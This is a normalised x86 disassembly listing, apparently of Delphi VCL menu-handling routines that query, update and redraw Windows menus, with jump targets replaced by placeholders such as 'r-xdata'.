mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_3aa6bc0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_3aa7ee0
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_3aa8044
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov [ ebp - 0xc ] eax
xor ebx ebx
call sub_3aa7e54
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_3aa7e90
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_3a84d90
xor eax eax
push ebp
push sub_3aa8117
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a84d90
xor eax eax
push ebp
push sub_3aa80ec
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_3aa7ef0
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a84d88
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa811e
mov eax [ rw-data ]
call sub_3a84d88
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_3aa7b18
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_3aa811e
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov bl 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa8140
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_3aa84d4
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_3aa84d4
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_3aa81fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_3aa8804
mov eax ebx
call sub_3a6a150
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
mov edi eax
test di 0x2
je r-xdata
test di 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test di 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_3aa82a8
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_3aa81fc
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_3a65510
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_3a65730
lea edx [ ebp - 0x200 ]
call sub_3a6a228
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_3aa833c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_3aa83b0
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3aa88ac
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3aa88ac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
movzx edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_3aa88ac
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_3aa83bc
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_3aa82a8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_3aa833c
mov eax ebx
call sub_3aa88d0
jmp r-xdata
sub_3aa8424
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
movzx ecx [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_3aa846c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_3abf5ac
mov eax ebx
call sub_3aa7a68
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_3abf5f0
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_3a83738
sub_3aa84a8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_3a83994
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_3aa846c
sub_3aa84ec
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_3aa7b18
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_3aa7b18
mov esi eax
xor eax eax
movzx eax [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_3ac4588
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_3aa8548
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_3aa8673
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_3aa7b18
mov edi eax
test edi edi
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_3aa7b18
mov edi eax
jmp r-xdata
test edi edi
je r-xdata
mov eax edi
call sub_3aa6694
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_3aa66a4
mov edi eax
lea eax [ ebp - 0x8 ]
mov edx [ edi + 0x30 ]
movzx edx [ edx ]
call sub_3a65488
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
movzx edx [ ebp + 0x8 ]
call sub_3a65488
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
sub esi 0x4
mov esi [ esi ]
push ebx
lea eax [ ebp - 0x10 ]
movzx edx [ ebp + 0x8 ]
call sub_3a65488
mov eax [ ebp - 0x10 ]
call sub_3a65730
push eax
push esi
lea eax [ ebp - 0x14 ]
mov edx [ edi + 0x30 ]
movzx edx [ edx ]
call sub_3a65488
mov eax [ ebp - 0x14 ]
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
xor eax eax
lea edx [ ebp - 0x18 ]
mov eax [ edi + 0x30 ]
call sub_3aa9478
cmp [ ebp - 0x18 ] 0x0
sete al
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa867a
lea eax [ ebp - 0x18 ]
mov edx 0x5
call sub_3a652c4
retn
mov ebx eax
jmp r-xdata
sub_3aa8688
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
movzx eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_3aa84ec
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
movzx eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_3aa8548
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_3aa8804
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_3aa7c9c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_3aa7b18
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_3aa7b18
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_3a6a208
mov eax [ ebp + 0x10 ]
call sub_3a6a120
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_3aa88d0
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_3aac5e0
test eax eax
je r-xdata
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_3aa88ac
mov [ ebx + 0x41 ] 0x1
sub_3aa88f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_3a64530
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_3aa88ac
mov [ ebx + 0x41 ] 0x1
sub_3aa898c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_3aa8424
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_3aa82a8
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call __imp_SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_3aa8a20
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call __imp_SendMessageA
sub_3aa8a5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3aa8a86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aa8aa8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3aa8fdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa8fe3
lea eax [ ebp - 0x30 ]
call sub_3a652a0
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
mov edx [ esi + 0x4 ]
call sub_3aa7bd4
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_3acffcc
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
movzx edx [ esi + 0x4 ]
call sub_3aa7bb8
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_3aa8e0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_3aa8df2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_3a8a3c8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_3a8a25c
mov eax [ ebp - 0x24 ]
movzx eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_3aa92a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa8df9
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_3a8a3c8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_3aa8688
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_3aa7b18
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_3aa7b18
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_3aa8f52
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_3aa8f2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_3aa8f10
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_3a8a3c8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_3a8a25c
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa8f17
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_3a8a3c8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_3aac894
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acffcc
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_3aa7b18
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_3aa7b18
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
movzx ecx [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_3aa7b18
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_3aa7b48
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_3aa7b48
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x270 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x160 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_3acfbf4
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_3acfc7c
jmp r-xdata
sub_3aa8f34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_3aa8fec
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_3a7a33c
pop esi
pop ebx
retn
push ebx
push sub_3aa8a5c
call sub_3a847e0
mov [ ebx + 0x10 ] eax
sub_3aa9030
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3aa7920
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_3aa8fec
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aa90a4
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_3aa9014
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3aa79cc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3aa90fc
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_3aa2aec
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ eax + 0x34 ]
mov eax ebx
call sub_3aa88ac
mov [ ebx + 0x41 ] 0x1
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_3aa88ac
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_3aa9148
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
